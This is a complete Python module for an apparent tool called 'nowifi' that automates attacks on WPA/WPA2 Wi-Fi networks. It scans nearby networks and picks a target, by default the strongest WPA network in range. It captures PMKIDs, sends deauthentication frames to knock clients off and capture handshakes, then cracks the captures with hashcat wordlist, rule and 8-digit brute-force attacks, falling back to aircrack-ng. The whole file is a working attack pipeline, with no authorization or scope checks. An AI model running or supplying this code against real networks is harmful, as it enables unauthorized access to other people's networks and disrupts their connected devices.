"""WPA/WPA2/WPA3 password cracking module.

Orchestrates: hcxdumptool, hcxpcapngtool, hashcat, aircrack-ng.
Does NOT implement crypto -- wraps proven tools.

Techniques (ordered by effectiveness):
 1. PMKID capture      -- client-less, extract PMKID from AP's first message (~60% of APs)
 2. Handshake capture  -- deauth a client, capture 4-way handshake
 3. Hashcat crack      -- GPU-accelerated cracking (PMKID or handshake)
 4. Dictionary attack  -- wordlist-based cracking via aircrack-ng (CPU fallback)
 5. Online brute force -- modified wpa_supplicant (very slow, last resort)

On macOS, monitor mode requires a compatible external USB WiFi adapter.
The built-in card does not support it. The module reports this clearly
when no monitor-capable interface is found.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path


# ---------------------------------------------------------------------------
# Data types
# ---------------------------------------------------------------------------

class CrackMethod(Enum):
    PMKID = "pmkid_capture"
    HANDSHAKE = "handshake_capture"
    HASHCAT = "hashcat_crack"
    DICTIONARY = "dictionary_attack"
    ONLINE_BRUTE = "online_brute_force"


@dataclass
class WifiTarget:
    ssid: str
    bssid: str
    channel: int
    security: str  # WPA2, WPA3, WEP, Open
    signal: int  # dBm
    clients: list[str] = field(default_factory=list)  # client MACs


@dataclass
class CrackResult:
    method: CrackMethod
    success: bool
    password: str = ""
    details: str = ""
    capture_file: str = ""
    time_elapsed: float = 0.0


# ---------------------------------------------------------------------------
# Capture directory
# ---------------------------------------------------------------------------

_CAPTURE_DIR = Path.home() / ".nowifi" / "captures"


def _ensure_capture_dir() -> Path:
    """Create the capture directory if it does not exist."""
    _CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    return _CAPTURE_DIR


def _timestamped_dir(prefix: str) -> Path:
    """Create a timestamped subdirectory inside the capture directory."""
    ts = time.strftime("%Y%m%d_%H%M%S")
    d = _ensure_capture_dir() / f"{prefix}_{ts}"
    d.mkdir(parents=True, exist_ok=True)
    return d


# ---------------------------------------------------------------------------
# Tool discovery (matches tunnel.py pattern)
# ---------------------------------------------------------------------------

class ToolNotFound(Exception):
    """External tool not found."""

    def __init__(self, tool: str, install_hint: str):
        self.tool = tool
        self.install_hint = install_hint
        super().__init__(f"{tool} not found. Install: {install_hint}")


def _find_tool(name: str, install_hint: str, extra_paths: list[str] | None = None) -> str:
    """Find an executable by name, checking PATH and common locations.

    Raises ToolNotFound with install instructions if not found.
    """
    candidates: list[str | None] = [shutil.which(name)]
    if extra_paths:
        candidates.extend(extra_paths)
    candidates.extend([
        f"/usr/local/bin/{name}",
        f"/opt/homebrew/bin/{name}",
        os.path.expanduser(f"~/bin/{name}"),
    ])
    for candidate in candidates:
        if candidate and os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            return candidate
    raise ToolNotFound(name, install_hint)


def find_hcxdumptool() -> str:
    """Find hcxdumptool binary."""
    return _find_tool("hcxdumptool", "brew install hcxdumptool  OR  apt install hcxdumptool")


def find_hcxpcapngtool() -> str:
    """Find hcxpcapngtool binary (part of hcxtools)."""
    return _find_tool("hcxpcapngtool", "brew install hcxtools  OR  apt install hcxtools")


def find_hashcat() -> str:
    """Find hashcat binary."""
    return _find_tool("hashcat", "brew install hashcat  OR  apt install hashcat")


def find_aircrack() -> str:
    """Find aircrack-ng binary."""
    return _find_tool("aircrack-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")


def find_airodump() -> str:
    """Find airodump-ng binary."""
    return _find_tool("airodump-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")


def find_aireplay() -> str:
    """Find aireplay-ng binary."""
    return _find_tool("aireplay-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")


# ---------------------------------------------------------------------------
# Monitor mode helpers
# ---------------------------------------------------------------------------

def _check_monitor_mode(interface: str) -> bool:
    """Check if interface supports or is already in monitor mode.

    On macOS the built-in WiFi card does not support monitor mode.
    An external USB adapter (e.g., Alfa AWUS036ACH) is required.
    """
    try:
        result = subprocess.run(
            ["ifconfig", interface],
            capture_output=True, text=True, timeout=5,
        )
        # On Linux, monitor mode shows as "Mode:Monitor" in iwconfig
        # On macOS, there is no native monitor mode indicator for en0
        if "monitor" in result.stdout.lower():
            return True
    except (subprocess.TimeoutExpired, OSError):
        pass

    # Try iwconfig (Linux)
    try:
        result = subprocess.run(
            ["iwconfig", interface],
            capture_output=True, text=True, timeout=5,
        )
        if "Mode:Monitor" in result.stdout:
            return True
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    return False


def _is_macos() -> bool:
    """Check if running on macOS."""
    import platform
    return platform.system() == "Darwin"


# ---------------------------------------------------------------------------
# Scanning
# ---------------------------------------------------------------------------

_BSSID_RE = re.compile(r"([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}")


def scan_targets(interface: str = "en0", duration: int = 10) -> list[WifiTarget]:
    """Scan for WiFi networks and identify crackable targets.

    Uses system_profiler on macOS (passive, no monitor mode needed).
    Uses iw/iwlist on Linux.
    Returns list of WifiTarget sorted by signal strength (strongest first).
    """
    targets: list[WifiTarget] = []

    if _is_macos():
        targets = _scan_macos(interface)
    else:
        targets = _scan_linux(interface, duration)

    # Sort by signal strength (strongest first, dBm is negative)
    targets.sort(key=lambda t: t.signal, reverse=True)
    return targets


def _scan_macos(interface: str) -> list[WifiTarget]:
    """Scan using system_profiler SPAirPortDataType on macOS."""
    import json as _json

    targets: list[WifiTarget] = []

    try:
        result = subprocess.run(
            ["system_profiler", "SPAirPortDataType", "-json"],
            capture_output=True, text=True, timeout=15,
        )
        data = _json.loads(result.stdout)

        for item in data.get("SPAirPortDataType", []):
            interfaces = item.get("spairport_airport_interfaces", [])
            for iface in interfaces:
                # Other networks visible in the scan
                other_networks = iface.get("spairport_airport_other_local_wireless_networks", [])
                for net in other_networks:
                    ssid = net.get("_name", "")
                    if not ssid:
                        continue

                    bssid = net.get("spairport_network_bssid", "")
                    channel_str = str(net.get("spairport_network_channel", "0"))
                    # Channel string can be "6" or "6, 40MHz" -- extract number
                    channel = int(re.match(r"(\d+)", channel_str).group(1)) if re.match(r"(\d+)", channel_str) else 0
                    security = net.get("spairport_security_mode", "unknown")
                    signal = -99
                    signal_raw = net.get("spairport_signal_noise", "")
                    if signal_raw:
                        try:
                            signal = int(str(signal_raw).split()[0])
                        except (ValueError, IndexError):
                            pass

                    targets.append(WifiTarget(
                        ssid=ssid,
                        bssid=bssid,
                        channel=channel,
                        security=security,
                        signal=signal,
                    ))

                # Also include the currently connected network
                current = iface.get("spairport_current_network_information", {})
                if current:
                    ssid = current.get("_name", "")
                    if ssid:
                        bssid = current.get("spairport_network_bssid", "")
                        channel_str = str(current.get("spairport_network_channel", "0"))
                        channel = int(re.match(r"(\d+)", channel_str).group(1)) if re.match(r"(\d+)", channel_str) else 0
                        security = current.get("spairport_security_mode", "unknown")
                        signal = -99
                        signal_raw = current.get("spairport_signal_noise", "")
                        if signal_raw:
                            try:
                                signal = int(str(signal_raw).split()[0])
                            except (ValueError, IndexError):
                                pass
                        targets.append(WifiTarget(
                            ssid=ssid,
                            bssid=bssid,
                            channel=channel,
                            security=security,
                            signal=signal,
                        ))
    except (subprocess.TimeoutExpired, Exception):
        pass

    # Also try the airport utility for scan results
    if not targets:
        targets = _scan_macos_airport()

    return targets


def _scan_macos_airport() -> list[WifiTarget]:
    """Fallback: scan using the airport utility on macOS."""
    targets: list[WifiTarget] = []
    airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

    try:
        result = subprocess.run(
            [airport_path, "-s"],
            capture_output=True, text=True, timeout=15,
        )
        # Parse airport -s output: SSID BSSID RSSI CHANNEL HT CC SECURITY
        for line in result.stdout.splitlines()[1:]:  # Skip header
            parts = line.split()
            if len(parts) < 7:
                continue
            # SSID may contain spaces, BSSID is always in MAC format
            # Find the BSSID in the line (first MAC-like string)
            bssid_match = _BSSID_RE.search(line)
            if not bssid_match:
                continue

            bssid = bssid_match.group(0)
            bssid_pos = line.index(bssid)
            ssid = line[:bssid_pos].strip()
            remainder = line[bssid_pos + len(bssid):].strip().split()

            if len(remainder) < 4:
                continue

            try:
                rssi = int(remainder[0])
                channel = int(remainder[1])
            except (ValueError, IndexError):
                continue

            security = " ".join(remainder[3:]) if len(remainder) > 3 else "unknown"

            targets.append(WifiTarget(
                ssid=ssid,
                bssid=bssid,
                channel=channel,
                security=security,
                signal=rssi,
            ))
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass

    return targets


def _scan_linux(interface: str, duration: int) -> list[WifiTarget]:
    """Scan using iw on Linux."""
    targets: list[WifiTarget] = []

    try:
        # Trigger a scan
        subprocess.run(
            ["sudo", "iw", "dev", interface, "scan"],
            capture_output=True, text=True, timeout=duration + 10,
        )
        # Parse scan results
        result = subprocess.run(
            ["sudo", "iw", "dev", interface, "scan", "dump"],
            capture_output=True, text=True, timeout=10,
        )

        current: dict[str, str | int] = {}
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("BSS "):
                # Save previous entry
                if current.get("bssid"):
                    targets.append(WifiTarget(
                        ssid=str(current.get("ssid", "")),
                        bssid=str(current["bssid"]),
                        channel=int(current.get("channel", 0)),
                        security=str(current.get("security", "unknown")),
                        signal=int(current.get("signal", -99)),
                    ))
                bssid_match = _BSSID_RE.search(line)
                current = {"bssid": bssid_match.group(0) if bssid_match else ""}
            elif line.startswith("SSID:"):
                current["ssid"] = line[5:].strip()
            elif line.startswith("signal:"):
                try:
                    current["signal"] = int(float(line.split(":")[1].strip().split()[0]))
                except (ValueError, IndexError):
                    pass
            elif line.startswith("DS Parameter set: channel"):
                try:
                    current["channel"] = int(line.split("channel")[1].strip())
                except (ValueError, IndexError):
                    pass
            elif "WPA" in line or "RSN" in line:
                current["security"] = "WPA2" if "RSN" in line else "WPA"

        # Final entry
        if current.get("bssid"):
            targets.append(WifiTarget(
                ssid=str(current.get("ssid", "")),
                bssid=str(current["bssid"]),
                channel=int(current.get("channel", 0)),
                security=str(current.get("security", "unknown")),
                signal=int(current.get("signal", -99)),
            ))
    except (subprocess.TimeoutExpired, OSError):
        pass

    return targets


# ---------------------------------------------------------------------------
# PMKID capture
# ---------------------------------------------------------------------------

def capture_pmkid(
    target: WifiTarget,
    interface: str,
    output_dir: Path | None = None,
    timeout: int = 60,
) -> CrackResult:
    """Capture PMKID from target AP using hcxdumptool.

    PMKID is extracted from the AP's first EAPOL message during association.
    Does NOT require any connected clients -- just associate and capture.
    Approximately 60% of APs are vulnerable.

    Args:
        target: The WiFi target (SSID, BSSID, channel).
        interface: Monitor-mode capable interface.
        output_dir: Directory for capture files (default: ~/.nowifi/captures/).
        timeout: Seconds to wait for PMKID capture.

    Returns:
        CrackResult with capture_file set if PMKID was captured.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.PMKID, success=False)

    if output_dir is None:
        output_dir = _timestamped_dir("pmkid")

    # Check monitor mode
    if not _check_monitor_mode(interface):
        if _is_macos():
            result.details = (
                "Monitor mode not available. macOS built-in WiFi does not support "
                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
            )
        else:
            result.details = (
                f"Interface {interface} is not in monitor mode. "
                f"Run: sudo airmon-ng start {interface}"
            )
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Find tools
    try:
        hcxdumptool = find_hcxdumptool()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    try:
        hcxpcapngtool = find_hcxpcapngtool()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Write filterlist (target BSSID)
    filterlist = output_dir / "filterlist.txt"
    # hcxdumptool expects BSSID without colons
    bssid_clean = target.bssid.replace(":", "").replace("-", "").lower()
    filterlist.write_text(bssid_clean + "\n")

    capture_file = output_dir / "capture.pcapng"

    # Run hcxdumptool
    cmd = [
        hcxdumptool,
        "-i", interface,
        "-o", str(capture_file),
        f"--filterlist_ap={filterlist}",
        "--filtermode=2",        # Only capture from listed APs
        "--enable_status=1",     # Status messages to stderr
    ]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    try:
        # Wait for PMKID capture or timeout
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    stderr_output = proc.stderr.read().decode(errors="replace") if proc.stderr else ""

    # Check if we got a capture file
    if not capture_file.exists() or capture_file.stat().st_size == 0:
        result.details = f"No PMKID captured within {timeout}s. {stderr_output[:200]}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Convert pcapng to hashcat format using hcxpcapngtool
    hash_file = output_dir / "hash.22000"
    conv_result = subprocess.run(
        [hcxpcapngtool, "-o", str(hash_file), str(capture_file)],
        capture_output=True, text=True, timeout=30,
    )

    if not hash_file.exists() or hash_file.stat().st_size == 0:
        result.details = f"Captured traffic but no PMKID extracted. {conv_result.stderr[:200]}"
        result.capture_file = str(capture_file)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Count PMKIDs extracted
    pmkid_count = 0
    try:
        with open(hash_file) as f:
            pmkid_count = sum(1 for line in f if line.strip())
    except OSError:
        pass

    result.success = True
    result.capture_file = str(hash_file)
    result.details = f"Captured {pmkid_count} PMKID(s) from {target.ssid} ({target.bssid})"
    result.time_elapsed = time.monotonic() - start_time
    return result


# ---------------------------------------------------------------------------
# Handshake capture
# ---------------------------------------------------------------------------

def capture_handshake(
    target: WifiTarget,
    interface: str,
    output_dir: Path | None = None,
    timeout: int = 120,
) -> CrackResult:
    """Capture WPA 4-way handshake by deauthing a client.

    Requires at least one client connected to the target AP.
    Sends deauth frames to disconnect a client, then captures the
    handshake when the client reconnects.

    Args:
        target: The WiFi target (must have clients).
        interface: Monitor-mode capable interface.
        output_dir: Directory for capture files.
        timeout: Seconds to wait for handshake capture.

    Returns:
        CrackResult with capture_file set if handshake was captured.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.HANDSHAKE, success=False)

    if output_dir is None:
        output_dir = _timestamped_dir("handshake")

    # Check monitor mode
    if not _check_monitor_mode(interface):
        if _is_macos():
            result.details = (
                "Monitor mode not available. macOS built-in WiFi does not support "
                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
            )
        else:
            result.details = (
                f"Interface {interface} is not in monitor mode. "
                f"Run: sudo airmon-ng start {interface}"
            )
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Prefer hcxdumptool (handles deauth + capture in one tool)
    try:
        return _capture_handshake_hcx(target, interface, output_dir, timeout, start_time)
    except ToolNotFound:
        pass

    # Fallback: airodump-ng + aireplay-ng
    try:
        return _capture_handshake_aircrack(target, interface, output_dir, timeout, start_time)
    except ToolNotFound as e:
        result.details = f"No capture tools available. {e}"
        result.time_elapsed = time.monotonic() - start_time
        return result


def _capture_handshake_hcx(
    target: WifiTarget,
    interface: str,
    output_dir: Path,
    timeout: int,
    start_time: float,
) -> CrackResult:
    """Capture handshake using hcxdumptool (handles deauth internally)."""
    hcxdumptool = find_hcxdumptool()
    hcxpcapngtool = find_hcxpcapngtool()

    result = CrackResult(method=CrackMethod.HANDSHAKE, success=False)

    filterlist = output_dir / "filterlist.txt"
    bssid_clean = target.bssid.replace(":", "").replace("-", "").lower()
    filterlist.write_text(bssid_clean + "\n")

    capture_file = output_dir / "capture.pcapng"

    cmd = [
        hcxdumptool,
        "-i", interface,
        "-o", str(capture_file),
        f"--filterlist_ap={filterlist}",
        "--filtermode=2",
        "--enable_status=1",
        "--active_beacon",       # Send beacon to provoke responses
        "--deauthentication",    # Send deauth to force reconnection
    ]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    stderr_output = proc.stderr.read().decode(errors="replace") if proc.stderr else ""

    if not capture_file.exists() or capture_file.stat().st_size == 0:
        result.details = f"No handshake captured within {timeout}s. {stderr_output[:200]}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Convert to hashcat format
    hash_file = output_dir / "hash.22000"
    subprocess.run(
        [hcxpcapngtool, "-o", str(hash_file), str(capture_file)],
        capture_output=True, text=True, timeout=30,
    )

    if not hash_file.exists() or hash_file.stat().st_size == 0:
        result.details = f"Captured traffic but no valid handshake extracted. {stderr_output[:200]}"
        result.capture_file = str(capture_file)
        result.time_elapsed = time.monotonic() - start_time
        return result

    hash_count = 0
    try:
        with open(hash_file) as f:
            hash_count = sum(1 for line in f if line.strip())
    except OSError:
        pass

    result.success = True
    result.capture_file = str(hash_file)
    result.details = f"Captured {hash_count} handshake(s) from {target.ssid} ({target.bssid})"
    result.time_elapsed = time.monotonic() - start_time
    return result


def _capture_handshake_aircrack(
    target: WifiTarget,
    interface: str,
    output_dir: Path,
    timeout: int,
    start_time: float,
) -> CrackResult:
    """Capture handshake using airodump-ng + aireplay-ng (aircrack-ng suite)."""
    airodump = find_airodump()
    aireplay = find_aireplay()

    result = CrackResult(method=CrackMethod.HANDSHAKE, success=False)

    capture_prefix = str(output_dir / "capture")

    # Start airodump-ng to capture traffic on the target channel
    airodump_proc = subprocess.Popen(
        [
            airodump,
            "-c", str(target.channel),
            "--bssid", target.bssid,
            "-w", capture_prefix,
            "--output-format", "pcap",
            interface,
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    # Give airodump time to start capturing
    time.sleep(3)

    # Send deauth to a client (or broadcast if no specific client known)
    deauth_target = target.clients[0] if target.clients else "FF:FF:FF:FF:FF:FF"
    try:
        subprocess.run(
            [
                aireplay,
                "--deauth", "5",
                "-a", target.bssid,
                "-c", deauth_target,
                interface,
            ],
            capture_output=True, text=True,
            timeout=30,
        )
    except (subprocess.TimeoutExpired, OSError):
        pass

    # Wait for handshake
    remaining = max(1, timeout - int(time.monotonic() - start_time))
    try:
        airodump_proc.wait(timeout=remaining)
    except subprocess.TimeoutExpired:
        airodump_proc.terminate()
        try:
            airodump_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump_proc.kill()

    # Look for the capture file (airodump adds -01.cap suffix)
    cap_file = None
    for suffix in ["-01.cap", "-01.pcap", "-01.pcapng"]:
        candidate = Path(capture_prefix + suffix)
        if candidate.exists() and candidate.stat().st_size > 0:
            cap_file = candidate
            break

    if cap_file is None:
        result.details = "No capture file produced by airodump-ng"
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Try to convert to hashcat format if hcxpcapngtool is available
    try:
        hcxpcapngtool = find_hcxpcapngtool()
        hash_file = output_dir / "hash.22000"
        subprocess.run(
            [hcxpcapngtool, "-o", str(hash_file), str(cap_file)],
            capture_output=True, text=True, timeout=30,
        )
        if hash_file.exists() and hash_file.stat().st_size > 0:
            result.success = True
            result.capture_file = str(hash_file)
            result.details = f"Handshake captured from {target.ssid} ({target.bssid})"
            result.time_elapsed = time.monotonic() - start_time
            return result
    except ToolNotFound:
        pass

    # Fall back to raw cap file (can be used with aircrack-ng directly)
    result.success = True
    result.capture_file = str(cap_file)
    result.details = f"Handshake captured (raw pcap) from {target.ssid} ({target.bssid})"
    result.time_elapsed = time.monotonic() - start_time
    return result


# ---------------------------------------------------------------------------
# Hashcat cracking
# ---------------------------------------------------------------------------

def crack_with_hashcat(
    hash_file: str,
    attack_mode: str = "dictionary",
    wordlist: str = "",
) -> CrackResult:
    """Crack captured hash with hashcat (GPU-accelerated).

    Args:
        hash_file: Path to the .22000 hash file (from hcxpcapngtool).
        attack_mode: "dictionary" (mode 0), "brute" (mode 3), or "rule" (mode 0 + rules).
        wordlist: Path to wordlist file. Auto-detected if empty.

    Returns:
        CrackResult with password if cracked.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.HASHCAT, success=False)

    if not os.path.isfile(hash_file):
        result.details = f"Hash file not found: {hash_file}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    try:
        hashcat_path = find_hashcat()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    # Build hashcat command
    # Mode 22000 handles both PMKID and handshake hashes (WPA-PBKDF2-PMKID+EAPOL)
    cmd = [hashcat_path, "-m", "22000"]

    if attack_mode == "brute":
        # Brute force mode: try 8-digit numeric passwords (very common for ISP defaults)
        cmd.extend(["-a", "3", hash_file, "?d?d?d?d?d?d?d?d"])
    elif attack_mode == "rule":
        # Dictionary + rules
        if not wordlist:
            wordlists = find_wordlists()
            if not wordlists:
                result.details = "No wordlist found. Specify --wordlist or install rockyou.txt"
                result.time_elapsed = time.monotonic() - start_time
                return result
            wordlist = wordlists[0]
        cmd.extend(["-a", "0", "-r", _find_hashcat_rules(hashcat_path), hash_file, wordlist])
    else:
        # Dictionary mode (default)
        if not wordlist:
            wordlists = find_wordlists()
            if not wordlists:
                result.details = "No wordlist found. Specify --wordlist or install rockyou.txt"
                result.time_elapsed = time.monotonic() - start_time
                return result
            wordlist = wordlists[0]
        cmd.extend(["-a", "0", hash_file, wordlist])

    # Add common hashcat options
    cmd.extend([
        "--potfile-disable",   # Don't use potfile (we track results ourselves)
        "--status",            # Print status updates
        "--status-timer=10",   # Every 10 seconds
        "-O",                  # Optimized kernels
        "--quiet",             # Suppress banner
    ])

    # Detect GPU backend
    if _is_macos():
        cmd.extend(["--backend-devices=1"])  # Metal backend on macOS

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    stdout_data, stderr_data = proc.communicate()
    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""
    stderr_text = stderr_data.decode(errors="replace") if stderr_data else ""

    # Parse hashcat output for cracked password
    # Format: hash:password
    password = _parse_hashcat_output(stdout_text, hash_file)

    if password:
        result.success = True
        result.password = password
        result.details = f"Password cracked: {password}"
    else:
        # Check if hashcat exhausted the wordlist
        if proc.returncode == 1:
            result.details = "Hashcat exhausted wordlist -- password not found"
        elif proc.returncode == 0:
            # Returncode 0 but no password parsed -- try reading potfile/outfile
            result.details = "Hashcat completed but no password parsed from output"
        else:
            result.details = f"Hashcat exited with code {proc.returncode}. {stderr_text[:200]}"

    result.capture_file = hash_file
    result.time_elapsed = time.monotonic() - start_time
    return result


def _parse_hashcat_output(stdout: str, hash_file: str) -> str:
    """Parse hashcat stdout for cracked password.

    Hashcat prints cracked hashes as: <hash>:<password>
    For WPA mode 22000, the hash line is long, password is after the last colon.
    """
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or line.startswith("Session"):
            continue
        # WPA hash format: WPA*02*pmkid*mac_ap*mac_sta*essid*...:password
        # or just hash:password on the cracked line
        if ":" in line and ("WPA" in line or line.count(":") > 3):
            # Password is everything after the last colon in the hash line
            password = line.rsplit(":", 1)[-1]
            if password and password != line:
                return password

    return ""


def _find_hashcat_rules(hashcat_path: str) -> str:
    """Find a hashcat rules file for rule-based attacks."""
    hashcat_dir = Path(hashcat_path).parent
    rule_candidates = [
        hashcat_dir / "rules" / "best64.rule",
        hashcat_dir.parent / "share" / "hashcat" / "rules" / "best64.rule",
        Path("/usr/share/hashcat/rules/best64.rule"),
        Path("/opt/homebrew/share/hashcat/rules/best64.rule"),
        Path("/usr/local/share/hashcat/rules/best64.rule"),
    ]
    for candidate in rule_candidates:
        if candidate.exists():
            return str(candidate)
    # Fallback: just use best64.rule and hope hashcat finds it
    return "best64.rule"


# ---------------------------------------------------------------------------
# Aircrack-ng cracking (CPU fallback)
# ---------------------------------------------------------------------------

def crack_with_aircrack(capture_file: str, wordlist: str = "") -> CrackResult:
    """Crack captured handshake with aircrack-ng (CPU-only, slower than hashcat).

    This is a fallback when hashcat is not available. aircrack-ng is CPU-only
    and significantly slower, but it works on any system without GPU requirements.

    Args:
        capture_file: Path to .cap/.pcap file or .22000 hash file.
        wordlist: Path to wordlist. Auto-detected if empty.

    Returns:
        CrackResult with password if cracked.
    """
    start_time = time.monotonic()
    result = CrackResult(method=CrackMethod.DICTIONARY, success=False)

    if not os.path.isfile(capture_file):
        result.details = f"Capture file not found: {capture_file}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    try:
        aircrack_path = find_aircrack()
    except ToolNotFound as e:
        result.details = str(e)
        result.time_elapsed = time.monotonic() - start_time
        return result

    if not wordlist:
        wordlists = find_wordlists()
        if not wordlists:
            result.details = "No wordlist found. Specify --wordlist or install rockyou.txt"
            result.time_elapsed = time.monotonic() - start_time
            return result
        wordlist = wordlists[0]

    if not os.path.isfile(wordlist):
        result.details = f"Wordlist not found: {wordlist}"
        result.time_elapsed = time.monotonic() - start_time
        return result

    cmd = [aircrack_path, "-w", wordlist, "-q", capture_file]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    stdout_data, stderr_data = proc.communicate()
    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""

    # Parse aircrack-ng output for "KEY FOUND! [ password ]"
    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", stdout_text)
    if key_match:
        result.success = True
        result.password = key_match.group(1)
        result.details = f"Password cracked: {result.password}"
    else:
        result.details = "Password not found in wordlist"

    result.capture_file = capture_file
    result.time_elapsed = time.monotonic() - start_time
    return result


# ---------------------------------------------------------------------------
# Wordlist discovery
# ---------------------------------------------------------------------------

def find_wordlists() -> list[str]:
    """Find available wordlists on the system.

    Searches common locations for password lists. Returns paths
    sorted by preference (rockyou first, then by size).
    """
    common_paths = [
        Path("/usr/share/wordlists/rockyou.txt"),
        Path("/usr/share/wordlists/rockyou.txt.gz"),
        Path("/opt/homebrew/share/wordlists/rockyou.txt"),
        Path.home() / ".nowifi" / "wordlists" / "rockyou.txt",
        Path.home() / "wordlists" / "rockyou.txt",
        Path("/usr/share/wordlists/darkc0de.txt"),
        Path("/usr/share/wordlists/wifite.txt"),
        Path("/usr/share/john/password.lst"),
        Path("/usr/share/wordlists/fasttrack.txt"),
        Path("/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"),
        Path("/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"),
    ]

    # Also scan the ~/.nowifi/wordlists/ directory for any .txt files
    nowifi_wl_dir = Path.home() / ".nowifi" / "wordlists"
    if nowifi_wl_dir.is_dir():
        for f in nowifi_wl_dir.iterdir():
            if f.suffix in (".txt", ".lst") and f not in common_paths:
                common_paths.append(f)

    found: list[str] = []
    for path in common_paths:
        if path.exists() and path.stat().st_size > 0:
            found.append(str(path))

    return found


# ---------------------------------------------------------------------------
# Full cracking pipeline
# ---------------------------------------------------------------------------

def run_crack(
    interface: str = "en0",
    target_ssid: str = "",
    timeout: int = 300,
    wordlist: str = "",
) -> list[CrackResult]:
    """Run full cracking pipeline against a target.

    Pipeline:
    1. Scan for WiFi targets
    2. Select target (by SSID or strongest signal)
    3. Try PMKID capture (no clients needed, ~60% of APs)
    4. If PMKID captured, crack with hashcat
    5. If no PMKID, try handshake capture (needs connected clients)
    6. If handshake captured, crack with hashcat
    7. Fall back to aircrack-ng if hashcat unavailable

    Args:
        interface: WiFi interface (monitor-mode capable for capture).
        target_ssid: Target SSID to attack (empty = scan and pick strongest).
        timeout: Max seconds for each capture phase.
        wordlist: Path to wordlist (auto-detected if empty).

    Returns:
        List of all CrackResult objects from each attempted technique.
    """
    results: list[CrackResult] = []

    # Step 1: Scan for targets
    targets = scan_targets(interface)
    if not targets:
        results.append(CrackResult(
            method=CrackMethod.PMKID,
            success=False,
            details="No WiFi networks found. Check interface and WiFi connection.",
        ))
        return results

    # Step 2: Select target
    target: WifiTarget | None = None
    if target_ssid:
        for t in targets:
            if t.ssid.lower() == target_ssid.lower():
                target = t
                break
        if target is None:
            results.append(CrackResult(
                method=CrackMethod.PMKID,
                success=False,
                details=f"Target SSID '{target_ssid}' not found. "
                        f"Visible networks: {', '.join(t.ssid for t in targets[:10])}",
            ))
            return results
    else:
        # Pick WPA/WPA2 target with strongest signal
        wpa_targets = [t for t in targets if "wpa" in t.security.lower() or "wpa2" in t.security.lower()]
        if wpa_targets:
            target = wpa_targets[0]  # Already sorted by signal
        else:
            target = targets[0]

    # Step 3: Try PMKID capture (client-less, most effective)
    pmkid_result = capture_pmkid(target, interface, timeout=timeout)
    results.append(pmkid_result)

    if pmkid_result.success and pmkid_result.capture_file:
        # Step 4: Crack PMKID with hashcat
        crack_result = crack_with_hashcat(
            pmkid_result.capture_file,
            attack_mode="dictionary",
            wordlist=wordlist,
        )
        results.append(crack_result)

        if crack_result.success:
            return results

        # Try brute force (8-digit numeric, common ISP defaults)
        brute_result = crack_with_hashcat(
            pmkid_result.capture_file,
            attack_mode="brute",
        )
        results.append(brute_result)

        if brute_result.success:
            return results

        # Try aircrack-ng as fallback
        aircrack_result = crack_with_aircrack(pmkid_result.capture_file, wordlist)
        results.append(aircrack_result)

        if aircrack_result.success:
            return results

    # Step 5: Try handshake capture (needs clients)
    handshake_result = capture_handshake(target, interface, timeout=timeout)
    results.append(handshake_result)

    if handshake_result.success and handshake_result.capture_file:
        # Step 6: Crack handshake with hashcat
        crack_result = crack_with_hashcat(
            handshake_result.capture_file,
            attack_mode="dictionary",
            wordlist=wordlist,
        )
        results.append(crack_result)

        if crack_result.success:
            return results

        # Try brute force
        brute_result = crack_with_hashcat(
            handshake_result.capture_file,
            attack_mode="brute",
        )
        results.append(brute_result)

        if brute_result.success:
            return results

        # Aircrack-ng fallback
        aircrack_result = crack_with_aircrack(handshake_result.capture_file, wordlist)
        results.append(aircrack_result)

    return results
